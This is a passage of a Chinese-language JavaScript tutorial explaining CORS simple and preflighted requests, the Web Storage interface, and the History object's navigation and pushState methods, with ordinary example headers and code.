<p>凡是不同时满足上面两个条件，就属于非简单请求。一句话，简单请求就是简单的 HTTP 方法与简单的 HTTP 头信息的结合。</p>
<p>这样划分的原因是，表单在历史上一直可以跨域发出请求。简单请求就是表单请求，浏览器沿袭了传统的处理方式，不把行为复杂化，否则开发者可能转而使用表单，规避 CORS 的限制。对于非简单请求，浏览器会采用新的处理方式。</p>
<h3 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h3><h4 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h4><p>对于简单请求，浏览器直接发出 CORS 请求。具体来说，就是在头信息之中，增加一个<code>Origin</code>字段。</p>
<p>下面是一个例子，浏览器发现这次跨域 AJAX 请求是简单请求，就自动在头信息之中，添加一个<code>Origin</code>字段。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;cors HTTP&#x2F;1.1</span><br><span class="line">Origin: http:&#x2F;&#x2F;api.bob.com</span><br><span class="line">Host: api.alice.com</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0...</span><br></pre></td></tr></table></figure>

<p>上面的头信息中，<code>Origin</code>字段用来说明，本次请求来自哪个域（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p>
<p>如果<code>Origin</code>指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含<code>Access-Control-Allow-Origin</code>字段（详见下文），就知道出错了，从而抛出一个错误，被<code>XMLHttpRequest</code>的<code>onerror</code>回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是200。</p>
<p>如果<code>Origin</code>指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;api.bob.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Expose-Headers: FooBar</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br></pre></td></tr></table></figure>

<p>上面的头信息之中，有三个与 CORS 请求相关的字段，都以<code>Access-Control-</code>开头。</p>
<p><strong>（1）<code>Access-Control-Allow-Origin</code></strong></p>
<p>该字段是必须的。它的值要么是请求时<code>Origin</code>字段的值，要么是一个<code>*</code>，表示接受任意域名的请求。</p>
<p><strong>（2）<code>Access-Control-Allow-Credentials</code></strong></p>
<p>该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie。默认情况下，Cookie 不包括在 CORS 请求之中。设为<code>true</code>，即表示服务器明确许可，浏览器可以把 Cookie 包含在请求中，一起发给服务器。这个值也只能设为<code>true</code>，如果服务器不要浏览器发送 Cookie，不发送该字段即可。</p>
<p><strong>（3）<code>Access-Control-Expose-Headers</code></strong></p>
<p>该字段可选。CORS 请求时，<code>XMLHttpRequest</code>对象的<code>getResponseHeader()</code>方法只能拿到6个服务器返回的基本字段：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>。如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。上面的例子指定，<code>getResponseHeader(&#39;FooBar&#39;)</code>可以返回<code>FooBar</code>字段的值。</p>
<h4 id="withCredentials-属性"><a href="#withCredentials-属性" class="headerlink" title="withCredentials 属性"></a>withCredentials 属性</h4><p>上面说到，CORS 请求默认不包含 Cookie 信息（以及 HTTP 认证信息等），这是为了降低 CSRF 攻击的风险。但是某些场合，服务器可能需要拿到 Cookie，这时需要服务器显式指定<code>Access-Control-Allow-Credentials</code>字段，告诉浏览器可以发送 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>

<p>同时，开发者必须在 AJAX 请求中打开<code>withCredentials</code>属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.withCredentials &#x3D; true;</span><br></pre></td></tr></table></figure>

<p>否则，即使服务器要求发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。</p>
<p>但是，有的浏览器默认将<code>withCredentials</code>属性设为<code>true</code>。这导致如果省略<code>withCredentials</code>设置，这些浏览器可能还是会一起发送 Cookie。这时，可以显式关闭<code>withCredentials</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.withCredentials &#x3D; false;</span><br></pre></td></tr></table></figure>

<p>需要注意的是，如果服务器要求浏览器发送 Cookie，<code>Access-Control-Allow-Origin</code>就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨域）原网页代码中的<code>document.cookie</code>也无法读取服务器域名下的 Cookie。</p>
<h3 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h3><h4 id="预检请求"><a href="#预检请求" class="headerlink" title="预检请求"></a>预检请求</h4><p>非简单请求是那种对服务器提出特殊要求的请求，比如请求方法是<code>PUT</code>或<code>DELETE</code>，或者<code>Content-Type</code>字段的类型是<code>application/json</code>。</p>
<p>非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为“预检”请求（preflight）。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 方法和头信息字段。只有得到肯定答复，浏览器才会发出正式的<code>XMLHttpRequest</code>请求，否则就报错。这是为了防止这些新增的请求，对传统的没有 CORS 支持的服务器形成压力，给服务器一个提前拒绝的机会，这样可以防止服务器收到大量<code>DELETE</code>和<code>PUT</code>请求，这些传统的表单不可能跨域发出的请求。</p>
<p>下面是一段浏览器的 JavaScript 脚本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var url &#x3D; &#39;http:&#x2F;&#x2F;api.alice.com&#x2F;cors&#39;;</span><br><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;PUT&#39;, url, true);</span><br><span class="line">xhr.setRequestHeader(&#39;X-Custom-Header&#39;, &#39;value&#39;);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<p>上面代码中，HTTP 请求的方法是<code>PUT</code>，并且发送一个自定义头信息<code>X-Custom-Header</code>。</p>
<p>浏览器发现，这是一个非简单请求，就自动发出一个“预检”请求，要求服务器确认可以这样请求。下面是这个“预检”请求的 HTTP 头信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS &#x2F;cors HTTP&#x2F;1.1</span><br><span class="line">Origin: http:&#x2F;&#x2F;api.bob.com</span><br><span class="line">Access-Control-Request-Method: PUT</span><br><span class="line">Access-Control-Request-Headers: X-Custom-Header</span><br><span class="line">Host: api.alice.com</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0...</span><br></pre></td></tr></table></figure>

<p>“预检”请求用的请求方法是<code>OPTIONS</code>，表示这个请求是用来询问的。头信息里面，关键字段是<code>Origin</code>，表示请求来自哪个源。</p>
<p>除了<code>Origin</code>字段，“预检”请求的头信息包括两个特殊字段。</p>
<p><strong>（1）<code>Access-Control-Request-Method</code></strong></p>
<p>该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是<code>PUT</code>。</p>
<p><strong>（2）<code>Access-Control-Request-Headers</code></strong></p>
<p>该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是<code>X-Custom-Header</code>。</p>
<h4 id="预检请求的回应"><a href="#预检请求的回应" class="headerlink" title="预检请求的回应"></a>预检请求的回应</h4><p>服务器收到“预检”请求以后，检查了<code>Origin</code>、<code>Access-Control-Request-Method</code>和<code>Access-Control-Request-Headers</code>字段以后，确认允许跨源请求，就可以做出回应。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 01:15:39 GMT</span><br><span class="line">Server: Apache&#x2F;2.0.61 (Unix)</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;api.bob.com</span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 0</span><br><span class="line">Keep-Alive: timeout&#x3D;2, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;plain</span><br></pre></td></tr></table></figure>

<p>上面的 HTTP 回应中，关键的是<code>Access-Control-Allow-Origin</code>字段，表示<code>http://api.bob.com</code>可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>

<p>如果服务器否定了“预检”请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段，或者明确表示请求不符合条件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS http:&#x2F;&#x2F;api.bob.com HTTP&#x2F;1.1</span><br><span class="line">Status: 200</span><br><span class="line">Access-Control-Allow-Origin: https:&#x2F;&#x2F;notyourdomain.com</span><br><span class="line">Access-Control-Allow-Method: POST</span><br></pre></td></tr></table></figure>

<p>上面的服务器回应，<code>Access-Control-Allow-Origin</code>字段明确不包括发出请求的<code>http://api.bob.com</code>。</p>
<p>这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被<code>XMLHttpRequest</code>对象的<code>onerror</code>回调函数捕获。控制台会打印出如下的报错信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XMLHttpRequest cannot load http:&#x2F;&#x2F;api.alice.com.</span><br><span class="line">Origin http:&#x2F;&#x2F;api.bob.com is not allowed by Access-Control-Allow-Origin.</span><br></pre></td></tr></table></figure>

<p>服务器回应的其他 CORS 相关字段如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Max-Age: 1728000</span><br></pre></td></tr></table></figure>

<p><strong>（1）<code>Access-Control-Allow-Methods</code></strong></p>
<p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次“预检”请求。</p>
<p><strong>（2）<code>Access-Control-Allow-Headers</code></strong></p>
<p>如果浏览器请求包括<code>Access-Control-Request-Headers</code>字段，则<code>Access-Control-Allow-Headers</code>字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在“预检”中请求的字段。</p>
<p><strong>（3）<code>Access-Control-Allow-Credentials</code></strong></p>
<p>该字段与简单请求时的含义相同。</p>
<p><strong>（4）<code>Access-Control-Max-Age</code></strong></p>
<p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p>
<h4 id="浏览器的正常请求和回应"><a href="#浏览器的正常请求和回应" class="headerlink" title="浏览器的正常请求和回应"></a>浏览器的正常请求和回应</h4><p>一旦服务器通过了“预检”请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个<code>Origin</code>头信息字段。服务器的回应，也都会有一个<code>Access-Control-Allow-Origin</code>头信息字段。</p>
<p>下面是“预检”请求之后，浏览器的正常 CORS 请求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;cors HTTP&#x2F;1.1</span><br><span class="line">Origin: http:&#x2F;&#x2F;api.bob.com</span><br><span class="line">Host: api.alice.com</span><br><span class="line">X-Custom-Header: value</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0...</span><br></pre></td></tr></table></figure>

<p>上面头信息的<code>Origin</code>字段是浏览器自动添加的。</p>
<p>下面是服务器正常的回应。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;api.bob.com</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br></pre></td></tr></table></figure>

<p>上面头信息中，<code>Access-Control-Allow-Origin</code>字段是每次回应都必定包含的。</p>
<h3 id="与-JSONP-的比较"><a href="#与-JSONP-的比较" class="headerlink" title="与 JSONP 的比较"></a>与 JSONP 的比较</h3><p>CORS 与 JSONP 的使用目的相同，但是比 JSONP 更强大。JSONP 只支持<code>GET</code>请求，CORS 支持所有类型的 HTTP 请求。JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。</p>
<h2 id="Storage-接口"><a href="#Storage-接口" class="headerlink" title="Storage 接口"></a>Storage 接口</h2><h3 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h3><p>Storage 接口用于脚本在浏览器保存数据。两个对象部署了这个接口：<code>window.sessionStorage</code>和<code>window.localStorage</code>。</p>
<p><code>sessionStorage</code>保存的数据用于浏览器的一次会话（session），当会话结束（通常是窗口关闭），数据被清空；<code>localStorage</code>保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。除了保存期限的长短不同，这两个对象的其他方面都一致。</p>
<p>保存的数据都以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。</p>
<p>这个接口很像 Cookie 的强化版，能够使用大得多的存储空间。目前，每个域名的存储上限视浏览器而定，Chrome 是 2.5MB，Firefox 和 Opera 是 5MB，IE 是 10MB。其中，Firefox 的存储空间由一级域名决定，而其他浏览器没有这个限制。也就是说，Firefox 中，<code>a.example.com</code>和<code>b.example.com</code>共享 5MB 的存储空间。另外，与 Cookie 一样，它们也受同域限制。某个网页存入的数据，只有同域下的网页才能读取，如果跨域操作会报错。</p>
<h3 id="属性和方法"><a href="#属性和方法" class="headerlink" title="属性和方法"></a>属性和方法</h3><p>Storage 接口只有一个属性。</p>
<ul>
<li><code>Storage.length</code>：返回保存的数据项个数。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">window.localStorage.setItem(&#39;foo&#39;, &#39;a&#39;);</span><br><span class="line">window.localStorage.setItem(&#39;bar&#39;, &#39;b&#39;);</span><br><span class="line">window.localStorage.setItem(&#39;baz&#39;, &#39;c&#39;);</span><br><span class="line"></span><br><span class="line">window.localStorage.length &#x2F;&#x2F; 3</span><br></pre></td></tr></table></figure>

<p>该接口提供5个方法。</p>
<h4 id="Storage-setItem"><a href="#Storage-setItem" class="headerlink" title="Storage.setItem()"></a>Storage.setItem()</h4><p><code>Storage.setItem()</code>方法用于存入数据。它接受两个参数，第一个是键名，第二个是保存的数据。如果键名已经存在，该方法会更新已有的键值。该方法没有返回值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.sessionStorage.setItem(&#39;key&#39;, &#39;value&#39;);</span><br><span class="line">window.localStorage.setItem(&#39;key&#39;, &#39;value&#39;);</span><br></pre></td></tr></table></figure>

<p>注意，<code>Storage.setItem()</code>两个参数都是字符串。如果不是字符串，会自动转成字符串，再存入浏览器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.sessionStorage.setItem(3, &#123; foo: 1 &#125;);</span><br><span class="line">window.sessionStorage.getItem(&#39;3&#39;) &#x2F;&#x2F; &quot;[object Object]&quot;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>setItem</code>方法的两个参数都不是字符串，但是存入的值都是字符串。</p>
<p>如果储存空间已满，该方法会抛错。</p>
<p>写入不一定要用这个方法，直接赋值也是可以的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 下面三种写法等价</span><br><span class="line">window.localStorage.foo &#x3D; &#39;123&#39;;</span><br><span class="line">window.localStorage[&#39;foo&#39;] &#x3D; &#39;123&#39;;</span><br><span class="line">window.localStorage.setItem(&#39;foo&#39;, &#39;123&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="Storage-getItem"><a href="#Storage-getItem" class="headerlink" title="Storage.getItem()"></a>Storage.getItem()</h4><p><code>Storage.getItem()</code>方法用于读取数据。它只有一个参数，就是键名。如果键名不存在，该方法返回<code>null</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.sessionStorage.getItem(&#39;key&#39;)</span><br><span class="line">window.localStorage.getItem(&#39;key&#39;)</span><br></pre></td></tr></table></figure>

<p>键名应该是一个字符串，否则会被自动转为字符串。</p>
<h4 id="Storage-removeItem"><a href="#Storage-removeItem" class="headerlink" title="Storage.removeItem()"></a>Storage.removeItem()</h4><p><code>Storage.removeItem()</code>方法用于清除某个键名对应的键值。它接受键名作为参数，如果键名不存在，该方法不会做任何事情。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessionStorage.removeItem(&#39;key&#39;);</span><br><span class="line">localStorage.removeItem(&#39;key&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="Storage-clear"><a href="#Storage-clear" class="headerlink" title="Storage.clear()"></a>Storage.clear()</h4><p><code>Storage.clear()</code>方法用于清除所有保存的数据。该方法的返回值是<code>undefined</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.sessionStorage.clear()</span><br><span class="line">window.localStorage.clear()</span><br></pre></td></tr></table></figure>

<h4 id="Storage-key"><a href="#Storage-key" class="headerlink" title="Storage.key()"></a>Storage.key()</h4><p><code>Storage.key()</code>方法接受一个整数作为参数（从零开始），返回该位置对应的键名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.sessionStorage.setItem(&#39;key&#39;, &#39;value&#39;);</span><br><span class="line">window.sessionStorage.key(0) &#x2F;&#x2F; &quot;key&quot;</span><br></pre></td></tr></table></figure>

<p>结合使用<code>Storage.length</code>属性和<code>Storage.key()</code>方法，可以遍历所有的键。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (var i &#x3D; 0; i &lt; window.localStorage.length; i++) &#123;</span><br><span class="line">  console.log(localStorage.key(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="storage-事件"><a href="#storage-事件" class="headerlink" title="storage 事件"></a>storage 事件</h3><p>Storage 接口储存的数据发生变化时，会触发 storage 事件，可以指定这个事件的监听函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&#39;storage&#39;, onStorageChange);</span><br></pre></td></tr></table></figure>

<p>监听函数接受一个<code>event</code>实例对象作为参数。这个实例对象继承了 StorageEvent 接口，有几个特有的属性，都是只读属性。</p>
<ul>
<li><code>StorageEvent.key</code>：字符串，表示发生变动的键名。如果 storage 事件是由<code>clear()</code>方法引起，该属性返回<code>null</code>。</li>
<li><code>StorageEvent.newValue</code>：字符串，表示新的键值。如果 storage 事件是由<code>clear()</code>方法或删除该键值对引发的，该属性返回<code>null</code>。</li>
<li><code>StorageEvent.oldValue</code>：字符串，表示旧的键值。如果该键值对是新增的，该属性返回<code>null</code>。</li>
<li><code>StorageEvent.storageArea</code>：对象，返回键值对所在的整个对象。也说是说，可以从这个属性上面拿到当前域名储存的所有键值对。</li>
<li><code>StorageEvent.url</code>：字符串，表示原始触发 storage 事件的那个网页的网址。</li>
</ul>
<p>下面是<code>StorageEvent.key</code>属性的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function onStorageChange(e) &#123;</span><br><span class="line">  console.log(e.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window.addEventListener(&#39;storage&#39;, onStorageChange);</span><br></pre></td></tr></table></figure>

<p>注意，该事件有一个很特别的地方，就是它不在导致数据变化的当前页面触发，而是在同一个域名的其他窗口触发。也就是说，如果浏览器只打开一个窗口，可能观察不到这个事件。比如同时打开多个窗口，当其中的一个窗口导致储存的数据发生改变时，只有在其他窗口才能观察到监听函数的执行。可以通过这种机制，实现多个窗口之间的通信。</p>
<h2 id="History-对象"><a href="#History-对象" class="headerlink" title="History 对象"></a>History 对象</h2><h3 id="概述-4"><a href="#概述-4" class="headerlink" title="概述"></a>概述</h3><p><code>window.history</code>属性指向 History 对象，它表示当前窗口的浏览历史。</p>
<p>History 对象保存了当前窗口访问过的所有页面网址。下面代码表示当前窗口一共访问过3个网址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.history.length &#x2F;&#x2F; 3</span><br></pre></td></tr></table></figure>

<p>由于安全原因，浏览器不允许脚本读取这些地址，但是允许在地址之间导航。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 后退到前一个网址</span><br><span class="line">history.back()</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 等同于</span><br><span class="line">history.go(-1)</span><br></pre></td></tr></table></figure>

<p>浏览器工具栏的“前进”和“后退”按钮，其实就是对 History 对象进行操作。</p>
<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>History 对象主要有两个属性。</p>
<ul>
<li><code>History.length</code>：当前窗口访问过的网址数量（包括当前网页）</li>
<li><code>History.state</code>：History 堆栈最上层的状态值（详见下文）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 当前窗口访问过多少个网页</span><br><span class="line">window.history.length &#x2F;&#x2F; 1</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; History 对象的当前状态</span><br><span class="line">&#x2F;&#x2F; 通常是 undefined，即未设置</span><br><span class="line">window.history.state &#x2F;&#x2F; undefined</span><br></pre></td></tr></table></figure>

<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><h4 id="History-back-、History-forward-、History-go"><a href="#History-back-、History-forward-、History-go" class="headerlink" title="History.back()、History.forward()、History.go()"></a>History.back()、History.forward()、History.go()</h4><p>这三个方法用于在历史之中移动。</p>
<ul>
<li><code>History.back()</code>：移动到上一个网址，等同于点击浏览器的后退键。对于第一个访问的网址，该方法无效果。</li>
<li><code>History.forward()</code>：移动到下一个网址，等同于点击浏览器的前进键。对于最后一个访问的网址，该方法无效果。</li>
<li><code>History.go()</code>：接受一个整数作为参数，以当前网址为基准，移动到参数指定的网址，比如<code>go(1)</code>相当于<code>forward()</code>，<code>go(-1)</code>相当于<code>back()</code>。如果参数超过实际存在的网址范围，该方法无效果；如果不指定参数，默认参数为<code>0</code>，相当于刷新当前页面。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">history.back();</span><br><span class="line">history.forward();</span><br><span class="line">history.go(-2);</span><br></pre></td></tr></table></figure>

<p><code>history.go(0)</code>相当于刷新当前页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history.go(0); &#x2F;&#x2F; 刷新当前页面</span><br></pre></td></tr></table></figure>

<p>注意，移动到以前访问过的页面时，页面通常是从浏览器缓存之中加载，而不是重新要求服务器发送新的网页。</p>
<h4 id="History-pushState"><a href="#History-pushState" class="headerlink" title="History.pushState()"></a>History.pushState()</h4><p><code>History.pushState()</code>方法用于在历史中添加一条记录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.history.pushState(state, title, url)</span><br></pre></td></tr></table></figure>

<p>该方法接受三个参数，依次为：</p>
<ul>
<li><code>state</code>：一个与添加的记录相关联的状态对象，主要用于<code>popstate</code>事件。该事件触发时，该对象会传入回调函数。也就是说，浏览器会将这个对象序列化以后保留在本地，重新载入这个页面的时候，可以拿到这个对象。如果不需要这个对象，此处可以填<code>null</code>。</li>
<li><code>title</code>：新页面的标题。但是，现在所有浏览器都忽视这个参数，所以这里可以填空字符串。</li>
<li><code>url</code>：新的网址，必须与当前页面处在同一个域。浏览器的地址栏将显示这个网址。</li>
</ul>
<p>假定当前网址是<code>example.com/1.html</code>，使用<code>pushState()</code>方法在浏览记录（History 对象）中添加一个新记录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var stateObj &#x3D; &#123; foo: &#39;bar&#39; &#125;;</span><br><span class="line">history.pushState(stateObj, &#39;page 2&#39;, &#39;2.html&#39;);</span><br></pre></td></tr></table></figure>

<p>添加新记录后，浏览器地址栏立刻显示<code>example.com/2.html</code>，但并不会跳转到<code>2.html</code>，甚至也不会检查<code>2.html</code>是否存在，它只是成为浏览历史中的最新记录。这时，在地址栏输入一个新的地址(比如访问<code>google.com</code>)，然后点击了倒退按钮，页面的 URL 将显示<code>2.html</code>；你再点击一次倒退按钮，URL 将显示<code>1.html</code>。</p>
<p>总之，<code>pushState()</code>方法不会触发页面刷新，只是导致 History 对象发生变化，地址栏会有反应。</p>
<p>使用该方法之后，就可以用<code>History.state</code>属性读出状态对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var stateObj &#x3D; &#123; foo: &#39;bar&#39; &#125;;</span><br><span class="line">history.pushState(stateObj, &#39;page 2&#39;, &#39;2.html&#39;);</span><br><span class="line">history.state &#x2F;&#x2F; &#123;foo: &quot;bar&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>pushState</code>的 URL 参数设置了一个新的锚点值（即<code>hash</code>），并不会触发<code>hashchange</code>事件。反过来，如果 URL 的锚点值变了，则会在 History 对象创建一条浏览记录。</p>
<p>如果<code>pushState()</code>方法设置了一个跨域网址，则会报错。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 报错</span><br><span class="line">&#x2F;&#x2F; 当前网址为 http:&#x2F;&#x2F;example.com</span><br><span class="line">history.pushState(null, &#39;&#39;, &#39;https:&#x2F;&#x2F;twitter.com&#x2F;hello&#39;);</span><br></pre></td></tr></table></figure>

